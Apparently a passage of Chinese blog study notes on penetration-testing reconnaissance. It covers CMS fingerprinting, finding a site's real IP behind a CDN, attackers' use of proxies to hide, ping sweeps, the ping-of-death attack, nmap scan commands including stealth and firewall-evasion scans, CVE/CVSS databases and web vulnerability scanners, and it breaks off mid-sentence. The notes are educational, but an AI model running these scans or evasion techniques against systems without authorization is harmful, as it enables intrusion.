+20世纪60年代，美国心理学家米尔格兰姆设计了一个连锁信件实验。米尔格兰姆把信随机发送给住在美国各城市的一部分居民，信中写有一个波士顿股票经纪人的名字，并要求每名收信人把这封信寄给自己认为是比较接近这名股票经纪人的朋友。这位朋友收到信后，再把信寄给他认为更接近这名股票经纪人的朋友。最终，大部分信件都寄到了这名股票经纪人手中，每封信平均经手6．2次到达。<br>
+于是，米尔格兰姆提出六度分割理论，认为世界上任意两个人之间建立联系，最多只需要6个人。</p>
+<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1625701752228.png" alt="" loading="lazy"></figure>
+<p>#其它一些重要的信息收集工具和方法</p>
+<p>NMAP，如：收集目标主机的端口使用信息<br>
+指纹识别<br>
+查找WEB站点的真实IP<br>
+收集敏感目录文件：DirBuster,kali中的OWASP ZAP, http://www.webscan.cc/<br>
+真正的目标WEB服务器，CDN服务器，</p>
+<p>针对网站目录的扫描工具主要有：DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py、 Sensitivefilescan、 Weakfilescan等工具。</p>
+<p>DirBuster是OWASP开发的一款基于JAVA编写的、专门用于探测WEB服务器的目录 和隐藏文件</p>
+<p><strong>指纹识别</strong><br>
+只有正确识别出WEB容器或网站CMS，才能查找与其相关的漏洞<br>
+常见的CMS有：Dedecms(织梦)、Discuz、PHPWEB、PHPCMS、PHPWind、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。<br>
+识别CMS的代表工具有：御剑WEB指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等。<br>
+除了这些工具，还可以利用一些在线网站来进行CMS指纹识别：<br>
+http://whatweb.bugscaner.com/look/<br>
+http://www.yunsee.cn/finger.html<br>
+https://whatweb.net/<br>
+CMS： 内容管理系统或者叫整站系统或者叫文章系统。在2004年之前，想完成网站内容管理，基本上都靠手工维护；</p>
+<p><strong>查找WEB站点的真实IP</strong><br>
+真正的目标WEB服务器：实际数据交互时还得找它。<br>
+CDN服务器：缓存静态的数据资源<br>
+1、判断目标是否使用了CDN；<br>
+如果目标服务器没使用CDN，www.ip138.com<br>
+通常会通过PING目标主域，观察域名的解析情况；还可以利用在线网站https://www.17ce.com<br>
+2、绕过CDN寻找真实IP<br>
+下边介绍一些常规的方法：<br>
+内部邮箱源<br>
+扫描网站测试文件<br>
+分站域名<br>
+国外访问：https://asm.ca.com/en/ping.php<br>
+查询域名的解析记录  www.netcraft.com<br>
+如果目标网站有自己的APP，可以尝试利用Fiddler或者Burp抓取APP的请求，从里边找到目标的真实IP<br>
+3、验证获取到的IP<br>
+最简单的验证方法是直接尝试用IP来访问此网站，看看打开的页面是不是和访问域名返回的内容一致！</p>
+<p>资料参考：<br>
+IP地址<br>
+http://dns.aizhan.com/<br>
+https://www.robtex.com<br>
+https://asm.ca.com/en/ping.php<br>
+http://who.is<br>
+http://www.yougetsignal.com/tools/web-sites-on-web-server/<br>
+http://toolbar.netcraft.com/site_report<br>
+http://www.siteinfotool.com/</p>
+<p>邮箱分析<br>
+http://www.all-nettools.com/toolbox/email-dossier.php</p>
+<p>CDN<br>
+http://www.cdnplanet.com/tools/cdnfinder/</p>
+<p>端口<br>
+http://www.t1shopper.com/tools/port-scan/</p>
+<p>综合<br>
+https://www.zoomeye.org<br>
+https://www.oshadan.com</p>
+<p>使用Kali Linux在渗透测试中信息收集http://www.freebuf.com/articles/system/58096.html</p>
+<p>利用metasploit进行信息收集<br>
+http://www.freebuf.com/articles/network/33905.html</p>
+<p>#2020-07-08</p>
+<p>#漏洞扫描</p>
+<p>分为：主动信息收集，主机信息扫描，漏洞扫描</p>
+<p>主动信息收集：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。例如：主机爱看i发的端口，服务，站点的目录结构等等<br>
+网络扫描：是一种基于internet远程监测目标网络或本地主机安全性脆弱的技术<br>
+枚举：攻击者主动探查一个网络，发现其中可以被利用有价值的信息</p>
+<p>主动信息收集的内容：<br>
+枚举的内容：<br>
+NETBIOS枚举：小型局域网协议<br>
+SNMP枚举：网络管理协议<br>
+Unix/Linux枚举：<br>
+LDAP枚举：目录访问协议<br>
+NTP枚举：网络时间协议<br>
+SMTP枚举：邮件服务协议<br>
+DNS枚举：域名解析协议</p>
+<p>#网络扫描<br>
+根据对方服务所采取的协议，在一定时间内，通过自身系统对对方协议进行特定读取，猜想验证，恶意破坏，并且将对方直接或间接的返回数据作为某指标的判断依据的一种行为。<br>
+网络安全扫描通过探测端口，服务，版本和这些服务及软件安全漏洞<br>
+网络安全扫描技术也是采用积极的，非破坏性的办法来检验系统是否有可能被攻击奔溃<br>
+利用一系列的脚本模拟对系统进行攻击的行为，并且对结果进行分析<br>
+这种技术通常被用来进行攻击实验和安全审计<br>
+网络安全扫描技术与防火墙，安全监控系统互相配合就能够为网络提供很高的安全性</p>
+<p>特点：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625740619180.png" alt="" loading="lazy"><br>
+网络扫描获取的信息<br>
+发现存活主句，ip地址，以及存活主机开放的端口<br>
+发现主机操作系统类型和系统结构<br>
+发现主机开启的服务类型<br>
+发现主机存在的漏洞</p>
+<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1625741473738.png" alt="" loading="lazy"></figure>
+<p>预备代理（扫描之间要使用代理）<br>
+直接与目标系统交互通信<br>
+无法避免留下访问的痕迹<br>
+所以要做好被封杀的准备</p>
+<h1 id="代理服务器">代理服务器</h1>
+<p>功能是代理网络用户取得网络信息<br>
+形象的说：他是网络信息的中转站，代理服务器就好像一个大的cache这样救恩那个显著提高浏览速度和效率，更重要的是：Proxy Server（代理服务器）是internet链路级网关所提供的一种重要的安全功能<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625742790643.png" alt="" loading="lazy"></p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1625743180435.png" alt="" loading="lazy"><br>
+1.突破自身IP访问限制，访问国外站点，教育网、google等<br>
+2.访问单位或团体内部资源，使用教育网内地址段免费代理服务器，就可以用于对教育网开放的各类FTP下载上传，以及各类资料查询共享<br>
+3.突破中国电信的IP封锁：中国电信用户有很多网站是被限制访问的，这种限制是人为的，不同Serve对地址的封锁是不同的。<br>
+4.提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区，当有外界的信息通过时，同时也将其保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。<br>
+5.隐藏真实IP：上网者也可以通过这种方法隐藏自己的IP，免受攻击。</p>
+<p>几种常见的代理</p>
+<p>Http代理：<br>
+www对于每一个上网的人都再熟悉不过了，www连接请求就是采用的http协议，所以我们在浏览网页，下载数据（也可采用ftp协议）时就是用http代理，他用长绑定在代理服务器的80，3128，8080端口上</p>
+<p>Socks代理：<br>
+采用socks协议的代理服务器jiushisocks服务器，是一种通用的代理服务器<br>
+使用socks需要了解：1.socks服务器的IP地址 2.socks服务所在的端口 3.这个socks服务是否需要用户认证？如果需要，您要向您的网络管理员申请一个用户和命令<br>
+应用：各种网游加速器</p>
+<p>Vpn代理<br>
+公用网络上建立专用网络的技术。整个vpn网络的任意两个结点架构在公用网络服务商isp所提供的网络平台之上的逻辑网络，用户的数据是通过公共网络中建立的逻辑隧道即点导电的虚拟专线进行传输的，通过相应的加密和认证技术来保证用户内部网络书据在公网上安全传输，从而真正实现网络数据的专有性。</p>
+<p>备注：HTTP代理<br>
+www对于每一个上网的人都再熟悉不过了，www连接请求就是采用的http协议，所以我们在浏览网页，下载数据（也可采用ftp协议）时就是用http代理。它通常绑定在代理服务器的80、3128、8080等端口上。<br>
+socks代理<br>
+采用socks协议的代理服务器就是SOCKS服务器，是一种通用的代理服务器。Socks是个电路级的底层网关，是DavidKoblas在1990年开发的，此后就一直作为Internet RFC标准的开放标准。Socks 不要求应用程序遵循特定的操作系统平台，Socks 代理与应用层代理、HTTP层代理不同，Socks 代理只是简单地传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。所以，Socks代理比其他应用层代理要快得多。它通常绑定在代理服务器的1080端口上。如果您在企业网或校园网上，需要透过防火墙或通过代理服务器访问 Internet就可能需要使用SOCKS。一般情况下，对于拨号上网用户都不需要使用它。注意，浏览网页时常用的代理服务器通常是专门的http代理，它和SOCKS是不同的。因此，您能浏览网页不等于 您一定可以通过SOCKS访问Internet。常用的防火墙，或代理软件都支持SOCKS，但需要其管理员打开这一功能。如果您不确信您是否需要SOCKS或是否有SOCKS可用，请与您的网络管理员联系。使用socks，需要了解一下内容：<br>
+① SOCKS服务器的IP地址<br>
+② SOCKS服务所在的端口<br>
+③ 这个SOCKS服务是否需要用户认证？如果需要，您要向您的网络管理员申请一个用户和口令<br>
+知道了上述信息，您就可以把这些信息填入“网络配置”中，或者在第一次登记时填入，您就可以使用socks代理了。[1] <br>
+在实际应用中SOCKS代理可以用作为：电子邮件、新闻组软件、网络传呼ICQ、网络聊天MIRC和使用代理服务器上联众打游戏等等各种游戏应用软件当中。[1] <br>
+VPN代理<br>
+指在共用网络上建立专用网络的技术。之所以称为虚拟网主要是因为整个VPN网络的任意两个结点之间的连接并没有传统专网建设所需的点到点的物理链路，而是架构在公用网络服务商ISP所提供的网络平台之上的逻辑网络。用户的数据是通过ISP在公共网络（Internet）中建立的逻辑隧道（Tunnel），即点到点的虚拟专线进行传输的。通过相应的加密和认证技术来保证用户内部网络数据在公网上安全传输，从而真正实现网络数据的专有性。</p>
+<p>攻击者可以通过使用代理服务器可以？<br>
+隐藏源地址，所以攻击可以在无任何法律论据的情况下入侵；<br>
+通过冒充一个代理的源地址来掩盖实际的攻击地址；<br>
+远程访问内网和其他通常禁止访问的网页资源；<br>
+拦截所有攻击者发送的请求并且将其他们转换为第三个目标，因此受害者这将只能识别代理服务器的地址；<br>
+攻击者将多个代理服务器连接起来以避免被探测到</p>
+<h1 id="主机信息扫描">主机信息扫描</h1>
+<p>判断存活主机<br>
+ping扫描值得是向主机发送ICMP ECHO请求报文。如果主机是活动的，他将返回一个ICMP ECHO应答<br>
+（PING：是DOS命令，一般用于检测网络通与不通，也叫时延，其值越大，速度越慢。PIING，因特网包探索器，用于测试网络连接量的程序，Ping发送一个ICMP(Internet Contron Messages Protocol);因特网信报控制协议）回声请求消息给目的地并且报告是否收到所希望的ICMP回声应答<br>
+它是用来检查网络是否通畅或者网络连接速度的命令。作为一个生活在网络上的管理员或者黑客来说，ping命令是一个必须掌握的DOS命令，她所利用的原理是这样的；利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少</p>
+<p>ping说明<br>
+指定包个数<br>
+Ping -n 2 200.200.0.20</p>
+<p>不间断发送ping包<br>
+Ping -t 200.200.0.20</p>
+<p>指定ping包字节大小<br>
+Ping -l 1000 200.200.0.20</p>
+<figure data-type="image" tabindex="3"><img src="https://jinqipiaopiao.github.io//post-images/1625791128315.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://jinqipiaopiao.github.io//post-images/1625791289444.png" alt="" loading="lazy"></figure>
+<p>ICMP的回送请求和应答报文通常是用来检查网路连通性，对于大多数系统而言，发送ICMP echo request 报文的命令是ping，由于ip数据包的最大长度为65535字节，而icmp报文位于数据报头之后，并与IP数据包封装在一起，因此icmp数据包最大尺寸不超过65515字节利用这一规定，可以向主句发动ping of death 攻击。 ping of death 攻击 是通过在最后分段中，改变其正确的偏移量和段长度的组合，使系统再接收到全部分段并重组报文时总的长度超过了65535字节，导致内粗哪一出，这时主机就会出现内存分配错误而导致TCP/IP堆栈奔溃导致死机</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1625791941578.png" alt="" loading="lazy"><br>
+PING扫射<br>
+同时扫描大量的ip地址段，以发现某个ip地址是否绑定活跃主机的扫描</p>
+<p>批量主机存活发现原理<br>
+客户端对二秘阁IP地址做出ICMP echo request 请求<br>
+存活的主机对请求做出ICMP echo reply 回应<br>
+不存活主机不做任何回应<br>
+服务端完成统计<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625791948248.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625791952113.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625791955705.png" alt="" loading="lazy"></p>
+<p>端口扫描---端口和服务<br>
+什么是服务：<br>
+“服务”是指某主机按预先定义的协议和一些国际标准，行业标准，向其他主机提供某种数据的支持，并且称服务提供者为“服务器”（Server），称服务请求者为“客户端”（Client）</p>
+<p><strong>端口和服务的关系</strong><br>
+一台主机可安装多个服务，这些服务可以是相同的服务，也可以是不同的服务，为了区分这些服务，引入端口（“port”）这个概念，即每一个服务对应于一个或者多个端口，端口具有独占性，一旦有服务占用了某个端口，则通常情况下，另外的服务不能再占用这个端口</p>
+<p>端口：是传输层协议为了识别统一主机上不同应用程序进程而引入的一个概念</p>
+<p><strong>端口的管理和分配</strong><br>
+端口有应用程序申请，操作系统统一管理和分配<br>
+一个应用程序会占用一个或者多个端口</p>
+<p>端口分类：<br>
+公认端口：<br>
+0-1023的端口是公认的，知名的</p>
+<p>0-255之间的端口由英特网名称与数字地址分配机构（ICANN）</p>
+<p>注册端口：<br>
+注册端口主要用于服务器对外提供服务<br>
+端口范围：1024-49151</p>
+<p>动态/私有端口<br>
+用于分配给用户编写的客户端应用程序<br>
+端口范围：49152-65535</p>
+<p><strong>常见知名端口：</strong><br>
+UDP端口：<br>
+161-SNMP，53-DNS，69-TFTP，111-RPC<br>
+TCP端口：<br>
+21-FTP，23-Telnet，25-SMTP，80-HTTP</p>
+<p>端口		应用层协议		说明<br>
+53		DNS			域名服务器<br>
+69		TFTP			简单文件传输协议<br>
+111		RPC			远程过程调用<br>
+161     SNMP			简单网络管理协议</p>
+<p>端口		应用层协议		说明<br>
+20		FTP			文件传输协议（数据连接）<br>
+21		FTP			文件传输协议（控制连接）<br>
+23		Telnet			远程登录协议<br>
+25		SMTP			简单文件传输协议<br>
+80		HTTP			超文本传输协议<br>
+110		POP3			邮局协议</p>
+<p><strong>端口扫描的原理</strong><br>
+原理：<br>
+端口扫描是向目标主机的TCP或UDP端口发送探测数据包，随后记录目标主机的响应。通过分析目标主机的响应来判断服务端口是打开还是关闭，据此推测目标主机端口提供的服务或信息</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1625799863444.png" alt="" loading="lazy"><br>
+Tcp客户端<br>
+对端口建立连接，记录远端服务器应答，查询记录获取目标服务器所安装的服务名称<br>
+Udp客户端<br>
+对端口建立连接，记录远端服务器应答，查询记录获取目标服务器所安装的服务名称</p>
+<p><strong>端口扫描-nmap</strong><br>
+定义：是由Gordon Loyon设计，用来探测计算机网络上的主机和服务的一种安全扫描器，为了绘制网络拓扑图，nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析，nmap是一款枚举和测试网络的强大工具<br>
+Nmap是目前业界最为知名、最为强大的端口扫描器。Nmap在安全领域内非常流行，像渗透工具Metasploit、漏洞扫描工具openVAS等工具都内置了Nmap，而漏洞扫描工具Nessus也支持导入Nmap扫描结果。<br>
+Nmap是主要用于基本的信息的搜集，包括主机活动状态、主机端口开放状况、应用服务及版本、操作系统与设备类型等等。</p>
+<p>作用：<br>
+主机探测：探测网络上的主机<br>
+端口探测：探测目标主机所开放的端口<br>
+版本检测：探测目标主机的网络服务名称以及版本号<br>
+系统监测：探测目标主机的操作系统以及网络设备的硬件特性</p>
+<p>主机探测：探测网络上的主机，例如列出响应TCP和ICMP请求、icmp请求、开放特别端口的主机。<br>
+端口扫描：探测目标主机所开放的端口。<br>
+版本检测：探测目标主机的网络服务，判断其服务名称及版本号。<br>
+系统检测：探测目标主机的操作系统及网络设备的硬件特性。<br>
+支持探测脚本的编写：使用Nmap的脚本引擎（NSE）和Lua编程语言。</p>
+<p>典型作用：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625800700470.png" alt="" loading="lazy"><br>
+1、通过对设备或者防火墙的探测来审计它的安全性。<br>
+2、探测目标主机所开放的端口。<br>
+3、网络存储，网络映射，维护和资产管理。（这个有待深入）<br>
+4、通过识别新的服务器审计网络的安全性。<br>
+5、探测网络上的主机。</p>
+<p>我们不能简单的认为开启21端口号就认为开启了FTP服务，我们完全可以将web服务开启在21端口 ，我们找到了存活主机，找到了开放的端口，接下来我们需要下一个扫描<br>
+通过服务类型探查可以：<br>
+探查活跃主机的系统及开放网络服务的类型<br>
+目标主机上运行着何种类型什么版本的操作系统<br>
+各个开放端口上监听的是哪些网络服务阶段，在开放端口后面是什么服务。</p>
+<p>服务扫描的内容：<br>
+标识符抓取<br>
+操作系统识别<br>
+服务类型识别<br>
+绘制网络拓扑</p>
+<p><strong>标识符提取</strong><br>
+Banner提取是一种活动，用于确定正在运行远程计算机上的服务信息。系统是管理人员和黑客也渗透测试使用经常使用，恶意黑客通过banner获取技术，识别目标主机的操作系统，进一步探测操作系统几倍的了偶东从而可以从这一级别进行渗透测试<br>
+操作系统和本系统应用一般是成套出现的，例如LAMP或者LNMP。操作系统的版本也有助于准确定位服务程序或者软件的版本，比如windows server 2003 搭载的IIS为6.0，windows server 2008 R2 搭载的是IIS7.5。</p>
+<p>banner中的信息<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625801930768.png" alt="" loading="lazy"></p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1625802167260.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625802194294.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="5"><img src="https://jinqipiaopiao.github.io//post-images/1625802341325.png" alt="" loading="lazy"></figure>
+<p>为什么要识别操作系统？<br>
+许多漏洞是系统相关的，而且往往与相应的版本对应；<br>
+从操作系统或者应用系统的具体实现中发掘出来的攻击手段都需要辨识系统；<br>
+操作系统的信息还可以与其他信息结合起来，比如漏洞库，社工库</p>
+<p><strong>操作系统识别的技术和原理</strong><br>
+原理：<br>
+操作系统扫描大部分都是基于TCP/IP协议栈的指纹检测技术的。</p>
+<p>做法：<br>
+寻找不同操作系统之间在处理网络数据包上的差异，并且把足够多的差异组合起来，以便精确地识别出一个系统的OS版本。</p>
+<p>不同操作系统类型和版本的差异性体现在？<br>
+协议栈实现差异－协议栈指纹鉴别<br>
+开放端口的差异－端口扫描<br>
+应用服务的差异－标识符提取</p>
+<p>扫描分类：<br>
+被动监听<br>
+主动探测</p>
+<figure data-type="image" tabindex="6"><img src="https://jinqipiaopiao.github.io//post-images/1625803603524.png" alt="" loading="lazy"></figure>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1625820444778.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625820451630.png" alt="" loading="lazy"></p>
+<p>TTL（域名解析在DNS服务器中存留时间）是 Time To Live的缩写，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。TTL是IPv4报头的一个8 bit字段。<br>
+注意：TTL与DNS TTL有区别。二者都是生存时间，前者指ICMP包的转发次数（跳数），后者指域名解析信息在DNS中的存在时间。</p>
+<figure data-type="image" tabindex="7"><img src="https://jinqipiaopiao.github.io//post-images/1625823274069.png" alt="" loading="lazy"></figure>
+<p>服务类型探测：<br>
+网络服务类型探查<br>
+-确定目标网络中开放端口上绑定的网络应用服务类型和版本<br>
+-了解目标系统更丰富信息，可支持进一步的操作系统辨识和漏洞识别</p>
+<p>网络服务主动探测<br>
+-网络服务旗标抓取和探测：nmap   -sV</p>
+<p>Nmap常用参数：<br>
+-v详细模式<br>
+-p指定端口范围<br>
+-O操作系统识别<br>
+-A全面检测</p>
+<p>-sV探测端口服务器版本<br>
+-sA ACK扫描 探测防火墙<br>
+-sP Ping扫描 快速扫描<br>
+-sS TCP SYN扫描 半开放扫描 比较隐蔽<br>
+-sT TCP扫描 完全建立连接 会在目标主机留下日志<br>
+-sU UDP扫描 制定端口开放</p>
+<p>1.半开放扫描1到65535端口（nmap –sS –p 1-65535 –v ip/url）<br>
+2.扫描C段存活主机（nmap –sP ip/url）<br>
+3.指定端口扫描（nmap –p 80,3389 ip/url）<br>
+4.扫描主机操作系统（nmap –O ip/url）<br>
+5.主机详细扫描（nmap –v -A ip/url）<br>
+6.穿透防火墙扫描<br>
+（nmap –Pn –A ip/url）<br>
+（nmap –sS –T4 ip/url）<br>
+（nmap –sF –T4 ip/url）<br>
+（nmap –sA –T4 ip/url）</p>
+<p>漏洞扫描</p>
+<p>漏洞：安全脆弱性<br>
+一般认为，漏洞是指硬件软件或策略上存在的安全缺陷，从而使得攻击者能够在未授权的情况下访问，控制系统</p>
+<p>漏洞扫描：<br>
+检查系统是否存在已公布安全漏洞，从而易于遭受网络攻击的技术</p>
+<p>漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用的漏洞的一种安全检测（渗透攻击）行为。<br>
+漏洞扫描技术是一类重要的网络安全技术，他和防火墙，入侵检测系统互相配合，能够有效提高网络的安全性。通过对网络的扫描，网络管理员能了解网络的安全设置和运行的应用服务，及时发现安全漏洞，客观评估网络风险等级。网络管理员能根据扫描的结果更正网络安全漏洞和系统中的错误设置，在黑客攻击前进行防范。如果说防火墙和网络监视系统是被动的防御手段，那么安全扫描就是一种主动的防范措施，能有效避免黑客攻击行为，做到防患于未然</p>
+<p>漏洞扫描可以发现：<br>
+网络拓扑和操作系统的脆弱点<br>
+开放的端口和进行的服务<br>
+应用程序和服务器配置错误<br>
+应用程序和服务脆弱点<br>
+网络拓扑和操作系统脆弱点</p>
+<h1 id="基本原理">基本原理：</h1>
+<p>1.漏洞库匹配法<br>
+漏洞扫描，收集信息-&gt;漏洞库匹配-&gt;漏洞发现<br>
+如：<br>
+CGI漏洞，FTP漏洞，SSH漏洞，HTTP漏洞<br>
+2.模拟攻击法<br>
+目录遍历漏洞探测，跨站漏洞，FTP弱口令探测等</p>
+<p>基于网络的漏洞扫描，就是通过远程检测目标主机TCP/IP不同端口的服务，记录目标主机给予的回答。用这种方法来了解目标主机的各种信息，获得相关信息后，与网络漏洞扫描系统提供的漏洞库进行匹配，如果满足匹配条则视为漏洞存在<br>
+话有一种方法就是通过模拟黑客的进攻手法，对目标主机系统进行攻击性的安全漏洞扫描，如测试弱口令等，如果模拟攻击成功则视为漏洞存在</p>
+<h1 id="漏洞库">漏洞库</h1>
+<p>CVSS（Common Vulnerability Scoring System）<br>
+CVSS是安全内容自动化协议（SCAP）的一部分<br>
+通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新<br>
+分值范围：0-10<br>
+不同机构按CVSS分值定义威胁的中，高，低威胁级别<br>
+CVSS体现弱点的风险，威胁级别（severity）表示弱点风险对企业的影响程度<br>
+CVSS分值是工业标准，但威胁级别不是</p>
+<p>通用漏洞评分系统（CVSS）诞生于2007年，是用于评估系统安全漏洞严重程度的一个行业公开标准。CVSS现在已经进入第二个版本，第三版正在开发中。它的主要目的是帮助人们建立衡量漏洞严重程度的标准，使得人们可以比较漏洞的严重程度，从而确定处理它们的优先级。CVSS得分基于一系列维度上的测量结果，这些测量维度被称为量度（Metrics）。漏洞的最终得分最大为10，最小为0。得分7<sub>10的漏洞通常被认为比较严重，得分在4</sub>6.9之间的是中级漏洞，0~3.9的则是低级漏洞。</p>
+<p><strong>其他概念</strong><br>
+OVAL（Open Vulnerability and Assessment Language）<br>
+• 描述漏洞检测方法的机器可识别语言。<br>
+• 详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作。<br>
+• OVAL使用XML语言描述，包含了严密的语法逻辑。</p>
+<p>CCE<br>
+• 描述软件配置缺陷的一种标准化格式。<br>
+• 在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式展现出来，便于配置缺陷评估的可量化操作。</p>
+<p>CPE（Common Product Enumeration）<br>
+• 信息技术产品、系统、软件包的结构化命名规范，分类命名。</p>
+<p>CWE（Common Weakness Enumeration）<br>
+• 常见漏洞类型的字典，描述不同类型漏洞的特征（访问控制、信息泄露、拒绝服务）</p>
+<p><strong>CVE漏洞库</strong><br>
+——为了规范漏洞的描述，MITER公司建立了一个通用的漏洞列表（Common Vulnerabilities &amp; Exposures，简称CVE）。<br>
+已公开的信息安全漏洞字典，统一的漏洞编号标准<br>
+MITRE公司负责维护（非盈利机构）<br>
+扫描器的大部分扫描项都对应一个CVE编号<br>
+实现不同厂商之间信息交换的统一标准<br>
+网址：http://cve.mitre.org/</p>
+<p><strong>其他漏洞库</strong></p>
+<p>国外漏洞库<br>
+BugTraq漏洞库（http://www.securityfocus.com/bid）<br>
+ICAT漏洞库（http://icat.nist.gov/icat.cfm）<br>
+X-Force漏洞库 （http://xforce.iss.net）<br>
+CERT/CC漏洞信息数据库（ http://www.cert.org ）</p>
+<p>国内漏洞库<br>
+国家计算机网络入侵防范中心（http://www.nipc.org.cn）<br>
+绿盟科技（http://www.nsfocus.com）<br>
+安全焦点（http://www.xfocus.net）<br>
+中国信息安全论坛（http://www.chinafirst.org.cn）<br>
+安络科技（http://www.cnns.net）<br>
+中国计算机网络应急处理协调中心（http://www.cert.org.cn）</p>
+<p>BugTraq漏洞数据库<br>
+是SecurityFocus公司维护的一个关于计算机安全漏洞详细信息讨论的邮件列表，内容包括：<br>
+漏洞的描述；<br>
+漏洞的渗透方法——漏洞的利用；<br>
+漏洞的修补方法等<br>
+SecurityFocus公司还创建了一个与CVE相兼容的数据库。通过互联网，该数据库向用户提供5种漏洞检索方式：<br>
+软件供应商；标题；关键字；BugTraq IDCVE ID<br>
+ICAT漏洞库<br>
+——美国标准技术研究所维护的一个与CVE相兼容的一个漏洞数据库；<br>
+——可以通过Web网页访问，可以以Microsoft Access数据库的格式下载到本地。<br>
+X-Force漏洞库<br>
+ISS公司维护的一个漏洞数据库 ，每条漏洞记录包括：<br>
+漏洞描述；受影响的平台；补救措施；风险等级；影响结果；报告时间；参考链接等。<br>
+CERT/CC漏洞信息数据库<br>
+——美国计算机安全应急响应组（Computer Emergency Response Team，CERT）与 CC （Common Criteria standard，通用评估准则 ）发布的数据库 ，每条漏洞记录包括：<br>
+漏洞描述、影响；<br>
+解决方案；<br>
+受影响的系统；<br>
+参考链接等。</p>
+<figure data-type="image" tabindex="8"><img src="https://jinqipiaopiao.github.io//post-images/1625831867784.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://jinqipiaopiao.github.io//post-images/1625835074661.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://jinqipiaopiao.github.io//post-images/1625835221537.png" alt="" loading="lazy"></figure>
+<p>WVS拥有大量的自动化特性和手动工具，它的工作方式：<br>
+1.它将会扫描整个网站，它通过跟踪站点上的所有链接和robots.txt（如果有的话）而实现扫描。然后WVS就会映射出站点的结构并显示每个文件的细节信息。<br>
+2.在上述的发现阶段或扫描过程之后，WVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程。WVS分析每一个页面中可以输入数据的地方，进而尝试所有的输入组合。这是一个自动扫描阶段。<br>
+3.在它发现漏洞之后，WVS就会在“Alerts Node（警告节点）”中报告这些漏洞。每一个警告都包含着漏洞信息和如何修复漏洞的建议。<br>
+4.在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较。使用报告工具，就可以创建一个专业的报告来总结这次扫描。<br>
+WVS自动地检查下面的漏洞和内容：<br>
+·版本检查，包括易受攻击的Web服务器，易受攻击的Web服务器技术<br>
+·CGI测试，包括检查Web服务器的问题，主要是决定在服务器上是否启用了危险的HTTP方法，例如PUT，TRACE，DELETE等等。<br>
+·参数操纵：主要包括跨站脚本攻击（XSS）、SQL注入攻击、代码执行、目录遍历攻击、文件入侵、脚本源代码泄漏、CRLF注入、PHP代码注入、XPath注入、LDAP注入、Cookie操纵、URL重定向、应用程序错误消息等。<br>
+·多请求参数操纵：主要是Blind SQL / XPath注入攻击<br>
+·文件检查：检查备份文件或目录，查找常见的文件（如日志文件、应用程序踪迹等），以及URL中的跨站脚本攻击，还要检查脚本错误等。<br>
+·目录检查，主要查看常见的文件，发现敏感的文件和目录，发现路径中的跨站脚本攻击等。<br>
+·Web应用程序：检查特定Web应用程序的已知漏洞的大型数据库，例如论坛、Web入口、CMS系统、电子商务应用程序和PHP库等。<br>
+·文本搜索：目录列表、源代码揭示、检查电子邮件地址、微软Office中可能的敏感信息、错误消息等。<br>
+·GHDB Google攻击数据库：可以检查数据库中1400多条GHDB搜索项目。<br>
+·Web服务：主要是参数处理，其中包括SQL注入/Blind SQL注入（即盲注攻击）、代码执行、XPath注入、应用程序错误消息等。<br>
+使用该软件所提供的手动工具，还可以执行其它的漏洞测试，包括输入合法检查、验证攻击、缓冲区溢出等。</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1625835259133.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625835280331.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625835303830.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625835334869.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625835372987.png" alt="" loading="lazy"></p>
+<p>AppScan扫描的原则<br>
+全面阶段包含两个阶段：探索和测试<br>
+探索阶段：<br>
+在第一个阶段里，appscan会通过模仿成web用户点击链接并且填写表单字段来探索站点（web应用程序h或web server）这就是探索阶段。探索阶段可以遍历每个url路径，并且分析后创建测试点<br>
+测试阶段：<br>
